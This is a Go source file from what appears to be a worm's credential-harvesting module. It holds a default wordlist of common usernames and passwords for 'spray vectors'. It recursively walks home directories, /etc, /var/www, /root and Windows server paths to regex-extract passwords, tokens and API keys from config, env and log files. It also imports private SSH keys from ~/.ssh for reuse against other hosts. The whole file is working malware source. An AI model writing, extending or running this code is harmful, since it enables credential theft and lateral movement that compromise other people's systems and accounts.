package main

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

// Credential store shared by all spray vectors. It is seeded with a
// modest default wordlist and fed by the harvest loop.
var (
	credMu     sync.Mutex
	credUsers  = []string{"root", "admin", "Administrator", "ubuntu", "user", "oracle", "postgres", "mysql", "sa"}
	credPasses = []string{"", "123456", "password", "admin", "Passw0rd", "Welcome1", "Password123", "Admin123", "12345678", "admin123", "P@ssw0rd", "letmein", "toor", "root"}
	credKeys   []ssh.Signer
)

var (
	credPassRe = regexp.MustCompile(`(?i)\b[\w]*(?:password|passwd|secret|token|api[_-]?key|pass)\b\s*[:=]\s*["']?([^\s"';&,]+)`)
	credUserRe = regexp.MustCompile(`(?i)\b[\w]*(?:user(?:name)?|login|username)\b\s*[:=]\s*["']?([^\s"';&,]+)`)
)

func addCredPass(p string) {
	p = strings.TrimSpace(strings.Trim(p, `"'`))
	if len(p) < 4 || len(p) > 64 {
		return
	}
	credMu.Lock()
	defer credMu.Unlock()
	for _, existing := range credPasses {
		if existing == p {
			return
		}
	}
	if len(credPasses) >= 256 {
		return
	}
	credPasses = append(credPasses, p)
}

func addCredUser(u string) {
	u = strings.TrimSpace(strings.Trim(u, `"'`))
	if len(u) < 2 || len(u) > 64 {
		return
	}
	credMu.Lock()
	defer credMu.Unlock()
	for _, existing := range credUsers {
		if existing == u {
			return
		}
	}
	if len(credUsers) >= 128 {
		return
	}
	credUsers = append(credUsers, u)
}

func addCredKey(s ssh.Signer) {
	fp := sshKeyFingerprint(s)
	credMu.Lock()
	defer credMu.Unlock()
	for _, existing := range credKeys {
		if sshKeyFingerprint(existing) == fp {
			return
		}
	}
	if len(credKeys) >= 16 {
		return
	}
	credKeys = append(credKeys, s)
}

func sshPubkeyLine(s ssh.Signer) string {
	return strings.TrimSpace(string(ssh.MarshalAuthorizedKey(s.PublicKey())))
}

// credentialHarvestLoop scans local files for credentials and private
// keys once at start, then periodically.
func (w *Worm) credentialHarvestLoop() {
	defer w.wg.Done()
	w.harvestPasswords()
	w.harvestSSHKeys()
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	for {
		select {
		case <-w.done:
			return
		case <-ticker.C:
			w.harvestPasswords()
			w.harvestSSHKeys()
		}
	}
}

var harvestExts = map[string]bool{
	".log": true, ".txt": true, ".conf": true, ".cfg": true, ".ini": true,
	".config": true, ".rdp": true, ".ovpn": true, ".env": true,
	".yaml": true, ".yml": true, ".json": true, ".xml": true,
	".ps1": true, ".sh": true, ".bat": true, ".cnf": true, ".properties": true,
}

var harvestSkipDirs = map[string]bool{
	"appdata": true, "node_modules": true, ".cache": true, ".git": true,
	"program files": true, "program files (x86)": true, "windows": true,
	"$recycle.bin": true, "system volume information": true, "temp": true,
}

func (w *Worm) harvestPasswords() {
	var roots []string
	if home, err := os.UserHomeDir(); err == nil {
		roots = append(roots, home)
	}
	profile := os.Getenv("USERPROFILE")
	if profile != "" {
		roots = append(roots, profile)
	}
	roots = append(roots, "/etc", "/var/www", "/opt", "/root", "C:\\inetpub", "C:\\xampp", "C:\\wamp", "C:\\ProgramData")
	seen := map[string]bool{}
	for _, root := range roots {
		if root == "" || seen[strings.ToLower(root)] {
			continue
		}
		seen[strings.ToLower(root)] = true
		w.walkForCreds(root, 0)
	}
}

func (w *Worm) walkForCreds(root string, depth int) {
	if depth > 7 || !w.running() {
		return
	}
	entries, err := os.ReadDir(root)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			name := strings.ToLower(e.Name())
			if harvestSkipDirs[name] {
				continue
			}
			w.walkForCreds(filepath.Join(root, e.Name()), depth+1)
			continue
		}
		ext := strings.ToLower(filepath.Ext(e.Name()))
		if !harvestExts[ext] {
			continue
		}
		info, err := e.Info()
		if err != nil || info.Size() > 4<<20 {
			continue
		}
		full := filepath.Join(root, e.Name())
		w.extractFromFile(full)
	}
}

func (w *Worm) extractFromFile(path string) {
	f, err := os.Open(path)
	if err != nil {
		return
	}
	defer f.Close()
	head := make([]byte, 1<<20)
	n, _ := io.ReadFull(f, head)
	if n == 0 {
		return
	}
	text := string(head[:n])
	for _, m := range credPassRe.FindAllStringSubmatch(text, 8) {
		if len(m) > 1 {
			addCredPass(m[1])
		}
	}
	for _, m := range credUserRe.FindAllStringSubmatch(text, 4) {
		if len(m) > 1 {
			addCredUser(m[1])
		}
	}
}

// harvestSSHKeys imports private keys found under .ssh directories.
func (w *Worm) harvestSSHKeys() {
	var homes []string
	if home, err := os.UserHomeDir(); err == nil {
		homes = append(homes, home)
	}
	if profile := os.Getenv("USERPROFILE"); profile != "" {
		homes = append(homes, profile)
	}
	for _, home := range homes {
		sshDir := filepath.Join(home, ".ssh")
		entries, err := os.ReadDir(sshDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || strings.HasSuffix(e.Name(), ".pub") {
				continue
			}
			if !strings.HasPrefix(e.Name(), "id_") {
				continue
			}
			data, err := os.ReadFile(filepath.Join(sshDir, e.Name()))
			if err != nil {
				continue
			}
			signer, err := ssh.ParsePrivateKey(data)
			if err != nil {
				continue
			}
			addCredKey(signer)
		}
	}
}

// --- tiny io/http helpers ----------------------------------------------

type ioLimitedReader struct {
	r io.Reader
	n int64
}

func (l *ioLimitedReader) Read(p []byte) (int, error) {
	if l.n <= 0 {
		return 0, io.EOF
	}
	if int64(len(p)) > l.n {
		p = p[:l.n]
	}
	n, err := l.r.Read(p)
	l.n -= int64(n)
	return n, err
}

func ioReadAll(r io.Reader) ([]byte, error) { return io.ReadAll(r) }

func newHTTPClient(timeout time.Duration) *http.Client {
	return &http.Client{Timeout: timeout}
}

func drainBody(resp *http.Response) {
	if resp == nil || resp.Body == nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func bytesReader(b []byte) io.Reader { return bytes.NewReader(b) }

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
